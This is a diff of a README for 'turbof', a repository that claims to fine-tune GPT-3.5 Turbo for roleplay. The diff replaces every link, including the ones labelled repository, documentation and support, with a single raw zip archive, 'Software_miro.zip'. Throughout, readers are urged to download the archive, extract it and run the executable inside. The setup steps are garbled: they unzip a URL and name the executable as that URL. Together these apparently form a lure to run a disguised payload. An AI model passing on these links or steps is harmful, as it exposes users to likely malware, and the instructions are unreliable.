@@ -1,6 +1,6 @@
 # 🚀 turbof - Fine-Tune GPT-3.5 Turbo for Roleplay
 
-[![Download turbof](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)
+[![Download turbof](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)
 
 ## 📖 About turbof
 
@@ -21,17 +21,17 @@ To get started with turbof, follow these simple steps:
 1. **Download turbof:**
    Click the link below to visit the Releases page and download the latest version of the application.
 
-   [Visit this page to download](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)
+   [Visit this page to download](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)
 
 2. **Extract the Files:**
    Once the download is complete, locate the downloaded file in your system. It will typically be in your "Downloads" folder. 
    
    - On Windows: Right-click the downloaded zip file, and select "Extract All." Follow the prompts to extract the files to a new folder.
    - On macOS: Double-click the zip file to automatically extract it.
-   - On Linux: Use a file manager to extract the zip file or run `unzip https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip` in the terminal.
+   - On Linux: Use a file manager to extract the zip file or run `unzip https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip` in the terminal.
 
 3. **Run the Application:**
-   Navigate to the folder where you just extracted the files. Look for the executable file named `https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip` (Windows), `turbof` (macOS and Linux). Double-click on it to start the application.
+   Navigate to the folder where you just extracted the files. Look for the executable file named `https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip` (Windows), `turbof` (macOS and Linux). Double-click on it to start the application.
 
 4. **Set Up Your Project:**
    After launching turbof, you will see a simple setup screen. Follow the on-screen instructions to set up your roleplay project. Input your preferences and any specific parameters you want to adjust.
@@ -50,7 +50,7 @@ To get started with turbof, follow these simple steps:
 To install turbof on your computer, please follow these instructions:
 
 1. Click the link below to access the Releases page.
-   [Visit this page to download](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)
+   [Visit this page to download](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)
 
 2. Choose the latest release, and download the appropriate file for your operating system. Make sure to save it in an accessible location.
 
@@ -82,8 +82,8 @@ For further information about utilizing turbof and improving your fine-tuning sk
 
 ## 🔗 Important Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)
-- [Documentation](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)
-- [Community Support](https://raw.githubusercontent.com/marinagarat/turbof/main/lichenologic/turbof.zip)
+- [GitHub Repository](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)
+- [Documentation](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)
+- [Community Support](https://github.com/marinagarat/turbof/raw/refs/heads/main/chats_example/Software_miro.zip)
 
 Enjoy your journey with turbof, and happy roleplaying!
